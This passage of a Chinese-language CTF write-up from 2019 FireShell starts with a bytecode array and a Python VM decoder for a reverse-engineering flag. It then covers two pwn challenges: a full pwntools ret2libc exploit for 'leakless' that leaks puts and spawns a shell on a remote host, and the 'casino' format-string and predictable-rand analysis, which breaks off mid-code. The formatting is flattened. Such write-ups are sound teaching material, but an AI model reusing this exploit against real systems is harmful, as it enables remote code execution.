0x00000000, 0x00000048, 0x00000006, 0x00000000, 0x00003918, 0x00000000, 0x00000043, 0x00000001, 0x00000000, 0x0000395B, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x0000AC11, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0000AC11, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x0002B044, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0002B044, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0012D1DC, 0x00000000, 0x0012D17D, 0x00000006, 0x00000002, 0x00000000, 0x0012D1DC, 0x00000000, 0x0012D1DC, 0x00000006, 0x00000000, 0x00000076, 0x00000000, 0x00000031, 0x00000001, 0x00000000, 0x000000A7, 0x00000000, 0x00000058, 0x00000001, 0x00000000, 0x000000FF, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000003FC, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x000013EC, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x000013F2, 0x00000000, 0x0000001D, 0x00000006, 0x00000000, 0x000013F2, 0x00000000, 0x00000041, 0x00000006, 0x00000000, 0x000013F2, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0000B382, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0004E88E, 0x00000000, 0x00000056, 0x00000006, 0x00000000, 0x0004E88E, 0x00000000, 0x00000034, 0x00000001, 0x00000000, 0x0004E8C2, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00225D4E, 0x00000000, 0x00225CD8, 0x00000006, 0x00000002, 0x00000000, 0x00225D4E, 0x00000000, 0x00225D4E, 0x00000006, 0x00000000, 0x0000006D, 0x00000000, 0x00000060, 0x00000006, 0x00000000, 0x0000006D, 0x00000000, 0x0000000D, 0x00000001, 0x00000000, 0x0000007A, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00000356, 0x00000000, 0x00000019, 0x00000006, 0x00000000, 0x00000356, 0x00000000, 0x0000002C, 0x00000006, 0x00000000, 0x00000356, 0x00000000, 0x00000018, 0x00000001, 0x00000000, 0x0000036E, 0x00000000, 0x00000040, 0x00000001, 0x00000000, 0x000003AE, 0x00000000, 0x0000000A, 0x00000001, 0x00000000, 0x000003B8, 0x00000000, 0x00000022, 0x00000006, 0x00000000, 0x000003B8, 0x00000000, 0x0000005A, 0x00000006, 0x00000000, 0x000003B8, 0x00000000, 0x00000063, 0x00000001, 0x00000000, 0x0000041B, 0x00000000, 0x000003AE, 0x00000006, 0x00000002, 0x00000000, 0x0000041B, 0x00000000, 0x0000041B, 0x00000006, 0x00000000, 0x00000035, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x00000096, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00000384, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00001518, 0x00000000, 0x00000010, 0x00000001, 0x00000000, 0x00001528, 0x00000000, 0x00000027, 0x00000006, 0x00000000, 0x00001528, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x0000A940, 0x00000000, 0x0000005D, 0x00000001, 0x00000000, 0x0000A99D, 0x00000000, 0x0000000B, 0x00000001, 0x00000000, 0x0000A9A8, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x0006A090, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x0013E1B0, 0x00000000, 0x0000000E, 0x00000001, 0x00000000, 0x0013E1BE, 0x00000000, 0x0013E189, 0x00000006, 0x00000002, 0x00000000, 0x0013E1BE, 0x00000000, 0x0013E1BE, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x0000002C, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x00000048, 0x00000001, 0x00000000, 0x000000A7, 0x00000000, 0x00000003, 0x00000006, 0x00000000, 0x000000A7, 0x00000000, 0x00000039, 0x00000001, 0x00000000, 0x000000E0, 0x00000000, 0x00000017, 0x00000001, 0x00000000, 0x000000F7, 0x00000000, 0x00000020, 0x00000006, 0x00000000, 0x000000F7, 0x00000000, 0x0000004E, 0x00000001, 0x00000000, 0x00000145, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x00000181, 0x00000000, 0x00000008, 0x00000006, 0x00000000, 0x00000181, 0x00000000, 0x00000027, 0x00000001, 0x00000000, 0x000001A8, 0x00000000, 0x00000035, 0x00000001, 0x00000000, 0x000001DD, 0x00000000, 0x00000004, 0x00000001, 0x00000000, 0x000001E1, 0x00000000, 0x0000003A, 0x00000006, 0x00000000, 0x000001E1, 0x00000000, 0x00000057, 0x00000001, 0x00000000, 0x00000238, 0x00000000, 0x0000005A, 0x00000001, 0x00000000, 0x00000292, 0x00000000, 0x0000000A, 0x00000006, 0x00000000, 0x00000292, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x000007B6, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x00004D1C, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00004D1C, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00009A38, 0x00000000, 0x000099D9, 0x00000006, 0x00000002, 0x00000000, 0x00009A38, 0x00000000, 0x00009A38, 0x00000006, 0x00000000, 0x00000061, 0x00000000, 0x0000003D, 0x00000006, 0x00000000, 0x00000061, 0x00000000, 0x00000014, 0x00000006, 0x00000000, 0x00000061, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00000123, 0x00000000, 0x00000021, 0x00000006, 0x00000000, 0x00000123, 0x00000000, 0x00000036, 0x00000006, 0x00000000, 0x00000123, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x00000123, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00000A3B, 0x00000000, 0x0000005A, 0x00000006, 0x00000000, 0x00000A3B, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00003327, 0x00000000, 0x00000012, 0x00000001, 0x00000000, 0x00003339, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x0002003A, 0x00000000, 0x0000003F, 0x00000001, 0x00000000, 0x00020079, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00120441, 0x00000000, 0x00000041, 0x00000006, 0x00000000, 0x00120441, 0x00000000, 0x0000002C, 0x00000006, 0x00000000, 0x00120441, 0x00000000, 0x00000021, 0x00000006, 0x00000000, 0x00120441, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x006C1986, 0x00000000, 0x00000033, 0x00000001, 0x00000000, 0x006C19B9, 0x00000000, 0x006C1958, 0x00000006, 0x00000002, 0x00000000, 0x006C19B9, 0x00000000, 0x006C19B9, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x00000063, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0000031E, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x00001F2C, 0x00000000, 0x00000027, 0x00000006, 0x00000000, 0x00001F2C, 0x00000000, 0x0000003C, 0x00000006, 0x00000000, 0x00001F2C, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00001F2C, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00005D84, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0001D394, 0x00000000, 0x00000006, 0x00000006, 0x00000000, 0x0001D394, 0x00000000, 0x00000021, 0x00000001, 0x00000000, 0x0001D3B5, 0x00000000, 0x00000006, 0x00000006, 0x00000000, 0x0001D3B5, 0x00000000, 0x0000005C, 0x00000001, 0x00000000, 0x0001D411, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00075044, 0x00000000, 0x00000011, 0x00000001, 0x00000000, 0x00075055, 0x00000000, 0x0000003A, 0x00000001, 0x00000000, 0x0007508F, 0x00000000, 0x00000060, 0x00000001, 0x00000000, 0x000750EF, 0x00000000, 0x0007507D, 0x00000006, 0x00000002, 0x00000000, 0x000750EF, 0x00000000, 0x000750EF, 0x00000006, 0x00000000, 0x00000033, 0x00000000, 0x0000000F, 0x00000006, 0x00000000, 0x00000033, 0x00000000, 0x00000032, 0x00000001, 0x00000000, 0x00000065, 0x00000000, 0x00000023, 0x00000001, 0x00000000, 0x00000088, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00000110, 0x00000000, 0x0000005B, 0x00000006, 0x00000000, 0x00000110, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000111, 0x00000000, 0x0000004A, 0x00000006, 0x00000000, 0x00000111, 0x00000000, 0x00000034, 0x00000006, 0x00000000, 0x00000111, 0x00000000, 0x00000020, 0x00000001, 0x00000000, 0x00000131, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x00000185, 0x00000000, 0x00000051, 0x00000006, 0x00000000, 0x00000185, 0x00000000, 0x00000152, 0x00000006, 0x00000002, 0x00000000, 0x00000185, 0x00000000, 0x00000185, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x000000B3, 0x00000000, 0x0000004D, 0x00000001, 0x00000000, 0x00000100, 0x00000000, 0x00000059, 0x00000001, 0x00000000, 0x00000159, 0x00000000, 0x00000004, 0x00000001, 0x00000000, 0x0000015D, 0x00000000, 0x00000022, 0x00000006, 0x00000000, 0x0000015D, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00000574, 0x00000000, 0x00000014, 0x00000006, 0x00000000, 0x00000574, 0x00000000, 0x0000005D, 0x00000006, 0x00000000, 0x00000574, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x0000105C, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0000105C, 0x00000000, 0x00000FFD, 0x00000006, 0x00000002, 0x00000000, 0x0000105C, 0x00000000, 0x0000105C, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x0000001C, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000072, 0x00000000, 0x0000004A, 0x00000001, 0x00000000, 0x000000BC, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x000000BC, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x000000BC, 0x00000000, 0x00000049, 0x00000006, 0x00000000, 0x000000BC, 0x00000000, 0x0000002E, 0x00000006, 0x00000000, 0x000000BC, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x000000BC, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x000003AC, 0x00000000, 0x00000051, 0x00000006, 0x00000000, 0x000003AC, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x000003AC, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x000003AC, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00001D60, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00005820, 0x00000000, 0x0000001F, 0x00000006, 0x00000000, 0x00005820, 0x00000000, 0x00000053, 0x00000001, 0x00000000, 0x00005873, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0000B0E6, 0x00000000, 0x00000063, 0x00000006, 0x00000000, 0x0000B0E6, 0x00000000, 0x0000B074, 0x00000006, 0x00000002, 0x00000000, 0x0000B0E6, 0x00000000, 0x0000B0E6, 0x00000006, 0x00000000, 0x00000033, 0x00000000, 0x0000004A, 0x00000001, 0x00000000, 0x0000007D, 0x00000000, 0x0000001B, 0x00000006, 0x00000000, 0x0000007D, 0x00000000, 0x00000001, 0x00000006, 0x00000000, 0x0000007D, 0x00000000, 0x0000001D, 0x00000001, 0x00000000, 0x0000009A, 0x00000000, 0x00000052, 0x00000001, 0x00000000, 0x000000EC, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x000000EC, 0x00000000, 0x0000001D, 0x00000001, 0x00000000, 0x00000109, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00000848, 0x00000000, 0x00000022, 0x00000001, 0x00000000, 0x0000086A, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x0000088F, 0x00000000, 0x00000009, 0x00000001, 0x00000000, 0x00000898, 0x00000000, 0x00000024, 0x00000006, 0x00000000, 0x00000898, 0x00000000, 0x0000005F, 0x00000001, 0x00000000, 0x000008F7, 0x00000000, 0x000008C4, 0x00000006, 0x00000002, 0x00000000, 0x000008F7, 0x00000000, 0x000008F7, 0x00000006, 0x00000000, 0x00000061, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000002A7, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00000FEA, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00002FBE, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x00002FFA, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00014FD6, 0x00000000, 0x00000015, 0x00000001, 0x00000000, 0x00014FEB, 0x00000000, 0x00000062, 0x00000006, 0x00000000, 0x00014FEB, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00053FAC, 0x00000000, 0x00000016, 0x00000006, 0x00000000, 0x00053FAC, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x00053FAC, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x002F3D0C, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00EC313C, 0x00000000, 0x00000015, 0x00000006, 0x00000000, 0x00EC313C, 0x00000000, 0x00000041, 0x00000001, 0x00000000, 0x00EC317D, 0x00000000, 0x00000004, 0x00000006, 0x00000000, 0x00EC317D, 0x00000000, 0x0000002A, 0x00000006, 0x00000000, 0x00EC317D, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x0939EEE2, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x530965F2, 0x00000000, 0x53096591, 0x00000006, 0x00000002, 0x00000000, 0x530965F2, 0x00000000, 0x530965F2, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000001B0, 0x00000000, 0x00000034, 0x00000001, 0x00000000, 0x000001E4, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00001104, 0x00000000, 0x0000001E, 0x00000001, 0x00000000, 0x00001122, 0x00000000, 0x00000005, 0x00000001, 0x00000000, 0x00001127, 0x00000000, 0x00000061, 0x00000006, 0x00000000, 0x00001127, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x00001127, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00007811, 0x00000000, 0x00000030, 0x00000006, 0x00000000, 0x00007811, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00007811, 0x00000000, 0x00000008, 0x00000001, 0x00000000, 0x00007819, 0x00000000, 0x00000025, 0x00000006, 0x00000000, 0x00007819, 0x00000000, 0x00000036, 0x00000006, 0x00000000, 0x00007819, 0x00000000, 0x0000002F, 0x00000001, 0x00000000, 0x00007848, 0x00000000, 0x0000000E, 0x00000001, 0x00000000, 0x00007856, 0x00000000, 0x00000053, 0x00000001, 0x00000000, 0x000078A9, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00025B4D, 0x00000000, 0x00000005, 0x00000006, 0x00000000, 0x00025B4D, 0x00000000, 0x00025AE1, 0x00000006, 0x00000002, 0x00000000, 0x00025B4D, 0x00000000, 0x00025B4D, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000036, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000037, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000002F4, 0x00000000, 0x0000000D, 0x00000006, 0x00000000, 0x000002F4, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x000002F4, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00000EC4, 0x00000000, 0x00000059, 0x00000006, 0x00000000, 0x00000EC4, 0x00000000, 0x00000036, 0x00000001, 0x00000000, 0x00000EFA, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000EFA, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x000077D0, 0x00000000, 0x00000055, 0x00000006, 0x00000000, 0x000077D0, 0x00000000, 0x00000060, 0x00000006, 0x00000000, 0x000077D0, 0x00000000, 0x00000035, 0x00000001, 0x00000000, 0x00007805, 0x00000000, 0x00007799, 0x00000006, 0x00000002, 0x00000000, 0x00007805, 0x00000000, 0x00007805, 0x00000006, 0x00000000, 0x00000079, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x00000079, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000079, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x0000007A, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000002DC, 0x00000000, 0x00000051, 0x00000006, 0x00000000, 0x000002DC, 0x00000000, 0x00000022, 0x00000001, 0x00000000, 0x000002FE, 0x00000000, 0x0000000D, 0x00000001, 0x00000000, 0x0000030B, 0x00000000, 0x00000052, 0x00000001, 0x00000000, 0x0000035D, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x0000035D, 0x00000000, 0x00000021, 0x00000006, 0x00000000, 0x0000035D, 0x00000000, 0x00000063, 0x00000001, 0x00000000, 0x000003C0, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x000021C0, 0x00000000, 0x0000002B, 0x00000006, 0x00000000, 0x000021C0, 0x00000000, 0x00002147, 0x00000006, 0x00000002, 0x00000000, 0x000021C0, 0x00000000, 0x000021C0, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x0000011D, 0x00000000, 0x00000020, 0x00000006, 0x00000000, 0x0000011D, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00000474, 0x00000000, 0x00000030, 0x00000006, 0x00000000, 0x00000474, 0x00000000, 0x00000024, 0x00000001, 0x00000000, 0x00000498, 0x00000000, 0x0000002D, 0x00000006, 0x00000000, 0x00000498, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x000016F8, 0x00000000, 0x00000007, 0x00000001, 0x00000000, 0x000016FF, 0x00000000, 0x00000058, 0x00000006, 0x00000000, 0x000016FF, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0000A0F9, 0x00000000, 0x00000030, 0x00000001, 0x00000000, 0x0000A129, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0004681F, 0x00000000, 0x00000049, 0x00000006, 0x00000000, 0x0004681F, 0x00000000, 0x00000044, 0x00000001, 0x00000000, 0x00046863, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0027AB7B, 0x00000000, 0x00000009, 0x00000006, 0x00000000, 0x0027AB7B, 0x00000000, 0x00000055, 0x00000006, 0x00000000, 0x0027AB7B, 0x00000000, 0x0027AB1C, 0x00000006, 0x00000002, 0x00000000, 0x0027AB7B, 0x00000000, 0x0027AB7B, 0x00000006, 0x00000000, 0x00000063, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00000252, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00000DEC, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00006174, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000185D0, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x0001860C, 0x00000000, 0x00000063, 0x00000006, 0x00000000, 0x0001860C, 0x00000000, 0x0000001A, 0x00000001, 0x00000000, 0x00018626, 0x00000000, 0x00000064, 0x00000001, 0x00000000, 0x0001868A, 0x00000000, 0x00000057, 0x00000006, 0x00000000, 0x0001868A, 0x00000000, 0x0000005D, 0x00000006, 0x00000000, 0x0001868A, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x0001868A, 0x00000000, 0x00018627, 0x00000006, 0x00000002, 0x00000000, 0x0001868A, 0x00000000, 0x0001868A, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000030, 0x00000000, 0x00000005, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000009, 0x00000001, 0x00000000, 0x00000039, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000039, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00000072, 0x00000000, 0x0000004E, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x0000002D, 0x00000001, 0x00000000, 0x0000009F, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0000013E, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x000003BA, 0x00000000, 0x00000029, 0x00000001, 0x00000000, 0x000003E3, 0x00000000, 0x000003B3, 0x00000006, 0x00000002, 0x00000000, 0x000003E3, 0x00000000, 0x000003E3, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x0000003E, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00000180, 0x00000000, 0x0000001A, 0x00000001, 0x00000000, 0x0000019A, 0x00000000, 0x0000000F, 0x00000001, 0x00000000, 0x000001A9, 0x00000000, 0x0000003A, 0x00000001, 0x00000000, 0x000001E3, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x000010FB, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x000010FB, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000043EC, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00021F60, 0x00000000, 0x00000009, 0x00000001, 0x00000000, 0x00021F69, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00043ED2, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x0021F690, 0x00000000, 0x00000013, 0x00000006, 0x00000000, 0x0021F690, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0021F690, 0x00000000, 0x0021F660, 0x00000006, 0x00000002, 0x00000000, 0x0021F690, 0x00000000, 0x0021F690, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x000003CC, 0x00000000, 0x00000025, 0x00000006, 0x00000000, 0x000003CC, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x000003CC, 0x00000000, 0x00000033, 0x00000006, 0x00000000, 0x000003CC, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00000B64, 0x00000000, 0x00000062, 0x00000006, 0x00000000, 0x00000B64, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x000071E8, 0x00000000, 0x00000023, 0x00000006, 0x00000000, 0x000071E8, 0x00000000, 0x00000033, 0x00000001, 0x00000000, 0x0000721B, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x0000726F, 0x00000000, 0x0000004A, 0x00000001, 0x00000000, 0x000072B9, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00023D9D, 0x00000000, 0x00000002, 0x00000006, 0x00000000, 0x00023D9D, 0x00000000, 0x00000015, 0x00000006, 0x00000000, 0x00023D9D, 0x00000000, 0x00000053, 0x00000001, 0x00000000, 0x00023DF0, 0x00000000, 0x00000004, 0x00000001, 0x00000000, 0x00023DF4, 0x00000000, 0x00023D88, 0x00000006, 0x00000002, 0x00000000, 0x00023DF4, 0x00000000, 0x00023DF4, 0x00000006, 0x00000000, 0x00000021, 0x00000000, 0x00000044, 0x00000006, 0x00000000, 0x00000021, 0x00000000, 0x0000005D, 0x00000001, 0x00000000, 0x0000007E, 0x00000000, 0x00000043, 0x00000006, 0x00000000, 0x0000007E, 0x00000000, 0x00000042, 0x00000006, 0x00000000, 0x0000007E, 0x00000000, 0x00000049, 0x00000001, 0x00000000, 0x000000C7, 0x00000000, 0x0000002C, 0x00000006, 0x00000000, 0x000000C7, 0x00000000, 0x00000038, 0x00000001, 0x00000000, 0x000000FF, 0x00000000, 0x00000029, 0x00000001, 0x00000000, 0x00000128, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x0000012E, 0x00000000, 0x00000008, 0x00000001, 0x00000000, 0x00000136, 0x00000000, 0x00000115, 0x00000006, 0x00000002, 0x00000000, 0x00000136, 0x00000000, 0x00000136, 0x00000006, 0x00000000, 0x0000007D, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000002EE, 0x00000000, 0x0000002E, 0x00000006, 0x00000000, 0x000002EE, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00000BB8, 0x00000000, 0x00000033, 0x00000006, 0x00000000, 0x00000BB8, 0x00000000, 0x00000014, 0x00000001, 0x00000000, 0x00000BCC, 0x00000000, 0x0000000E, 0x00000006, 0x00000000, 0x00000BCC, 0x00000000, 0x00000035, 0x00000006, 0x00000000, 0x00000BCC, 0x00000000, 0x0000001A, 0x00000001, 0x00000000, 0x00000BE6, 0x00000000, 0x00000058, 0x00000006, 0x00000000, 0x00000BE6, 0x00000000, 0x00000046, 0x00000006, 0x00000000, 0x00000BE6, 0x00000000, 0x00000042, 0x00000001, 0x00000000, 0x00000C28, 0x00000000, 0x0000000F, 0x00000006, 0x00000000, 0x00000C28, 0x00000000, 0x00000022, 0x00000001, 0x00000000, 0x00000C4A, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00003D72, 0x00000000, 0x00000053, 0x00000006, 0x00000000, 0x00003D72, 0x00000000, 0x0000000B, 0x00000001, 0x00000000, 0x00003D7D, 0x00000000, 0x0000005D, 0x00000006, 0x00000000, 0x00003D7D, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x00003D7D, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00022965, 0x00000000, 0x000228E8, 0x00000006, 0x00000002, 0x00000000, 0x00022965, 0x00000000, 0x00022965, 0x00000006, 0x00000003, 0x00000000]i = -1j = 0buf = [0 for k in range(530)]tmp = 0count = 1flag = ''while(True): if i - 1 != tmp and buf[i - 1] == 0: flag += chr(buf[i]) tmp = i - 1 c = code[j] if c == 0: i += 1 j += 1 buf[i] = code[j] elif c == 1: i -= 1 buf[i] += buf[i + 1] elif c == 3: print 'Over' break elif c == 4: i -= 1 buf[i] *= buf[i + 1] elif c == 5: i -= 1 buf[i] /= buf[i + 1] elif c == 6: i -= 1 buf[i] -= buf[i + 1] elif c == 2: j += 1 continue else: print 'Error' break print 'buf[&#123;&#125;] = &#123;&#125;'.format(str(i), hex(buf[i])) j += 1print flag 同时在 buf 的值中发现buf[0] = 0x46 = &#39;F&#39; ; buf[11] = 0, buf[12] = 0x23 = &#39;#&#39; ; ...，猜测每次输出为buf[i] = 0的后一个值即buf[i + 1]为 flag 的值。对脚本稍作修改后得到 flag。 PWNleakless简单栈溢出。 1234567[leakless] checksec leakless[*] '/root/ctf/2019-FireShell/leakless/leakless' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 没开 canary 和 pie。可以看到溢出漏洞在这里： 123456ssize_t feedme()&#123; char buf; // [esp+0h] [ebp-48h] return read(0, &amp;buf, 0x100u);&#125; 第一次先泄露出 puts 的地址，然后找到 libc 的版本，return 回feedme()函数。第二次直接跳 system。exp 如下： 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *context.log_level = 'debug'context.arch = 'i386'p = remote('35.243.188.20', 2002)elf = ELF('./leakless')offset = 76feedme = elf.symbols['feedme']puts_plt = elf.plt['puts']puts_got = elf.got['puts']log.success('feedme = ' + hex(feedme))log.success('puts_plt = ' + hex(puts_plt))log.success('puts_got = ' + hex(puts_got))payload1 = flat([ 'A' * offset, puts_plt, feedme, puts_got])p.sendline(payload1)puts = u32(p.recv(4))log.success('puts = ' + hex(puts))libc = LibcSearcher('puts', puts)libc_base = puts - libc.dump('puts')system = libc_base + libc.dump('system')str_bin_sh = libc_base + libc.dump('str_bin_sh')log.success('libc_base = ' + hex(libc_base))log.success('system = ' + hex(system))log.success('str_bin_sh = ' + hex(str_bin_sh))payload2 = flat([ 'A' * offset, system, 0x12345678, str_bin_sh])p.interactive() casino除了 pie 其他保护都开了： 1234567[casino] checksec casino 11:02:20[*] '/root/ctf/2019-FireShell/casino/casino' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 在 ida 里查看 main 函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+4h] [rbp-5Ch] int v5; // [rsp+8h] [rbp-58h] unsigned int i; // [rsp+Ch] [rbp-54h] unsigned int seed; // [rsp+10h] [rbp-50h] int v8; // [rsp+14h] [rbp-4Ch] FILE *stream; // [rsp+18h] [rbp-48h] char buf; // [rsp+20h] [rbp-40h] char ptr; // [rsp+30h] [rbp-30h] unsigned __int64 v12; // [rsp+58h] [rbp-8h] v12 = __readfsqword(0x28u); setup(*(_QWORD *)&amp;argc, argv, envp); seed = (unsigned int)time(0LL) / 0xA; printf(\"What is your name? \"); read(0, &amp;buf, 0x10uLL); printf(\"Welcome \", &amp;buf); printf(&amp;buf); putchar(10); seed += bet; srand(seed); v4 = 0; v5 = 0; for ( i = 1; (signed int)i &lt;= 99; ++i ) &#123; v8 = rand(); printf(\"[%d/100] Guess my number: \", i); __isoc99_scanf(\"%d\", &amp;v4); if ( v8 != v4 ) &#123; puts(\"Sorry! It was not my number\"); exit(0); &#125; puts(\"Correct!\"); v5 += bet; &#125; if ( v5 &gt; 100 ) &#123; puts(\"Cool! Here's another prize\"); stream = fopen(\"flag.txt\", \"r\"); fread(&amp;ptr, 0x1EuLL, 1uLL, stream); fclose(stream); printf(\"%s\", &amp;ptr); &#125; return 0;&#125; 需要猜 99 次随机数，然后使得由bet累加起来大于 100 即得到 flag。首先要过前面的猜数字，照样子写一个 c 程序即可： 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;time.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main() &#123; int seed = 